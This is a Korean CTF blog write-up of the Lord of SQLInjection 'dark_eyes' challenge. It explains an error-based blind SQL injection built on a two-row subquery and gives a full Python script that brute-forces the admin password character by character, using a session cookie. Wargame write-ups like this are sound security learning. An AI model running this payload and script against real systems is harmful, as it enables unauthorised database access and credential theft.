---
layout: single
title: "[Lord of SQLInjection] dark_eyes write-up"
date: 2025-05-01 16:23 +0900
categories: 
    - WEB-write-up
tag:
typora-root-url: ../
toc: true
toc_sticky: true
toc_label: 목차
author_profile: true
comment: true
sidebar:
    nav: "docs"
---

## Lord of SQLInjection (dark_eyes)

### 풀이

이번 문제에서는 `col if case when sleep benchmark` 키워드를 추가로 더 필터링 하여 Time based 및 Error based 를 하기 더 어려워졌다. 또한 SQL 에러가 발생하면 exit() 함수를 통해 빈 페이지가 나오는 것1을 알 수 있다. 아래 단락에서는 admin 패스워드를 pw 파라미터에 넣어야 최종적으로 solve가 된다.

![image-20250501162458798](/images/2025-05-01-los-dark-eyes/image-20250501162458798.png)

<br>

저번 문제에서는 (select 1 union select 2)로 2개의 row를 만들어서 오류를 만들었는데, 이를 응용해서 select 1=1은 row가 1개라 정상 쿼리고, select 1=2는 row가 2개여서 exit() 함수가 실행되는 것을 알 수 있다.

![image-20250502011506195](/images/2025-05-01-los-dark-eyes/image-20250502011506195.png)

<br>

익스플로잇 코드는 `select 1 union select 1=1` 에서 `1=1` 부분을 ascii와 substr 함수를 이용해서 참이면 에러가 안나고 strong 태그가 나오므로 Blind SQLi를 이용해서 아래처럼 코드를 짜면 된다.

```python
import requests

url = "https://los.rubiya.kr/chall/dark_eyes_4e0c557b6751028de2e64d4d0020e02c.php"
cookie = {"PHPSESSID": "g6ses6vrl4bnskead01if7jtb1"}
password = ""

for i in range(1, 100):
    found = False
    for j in range(32, 127):
        param = {
            "pw": f"' or id='admin' and (select 1 union select ascii(substr(pw,{i},1))={j})-- -"
        }
        r = requests.get(url=url, cookies=cookie, params=param)
        if "<strong>" in r.text:
            found = True
            password += chr(j)
            print(f"패스워드 {i}번째 문자는 {chr(j)}입니다.")
            break
    if not found:
        print("end")
        print(password)
        break
print(password)

```

![image-20250502012734530](/images/2025-05-01-los-dark-eyes/image-20250502012734530.png)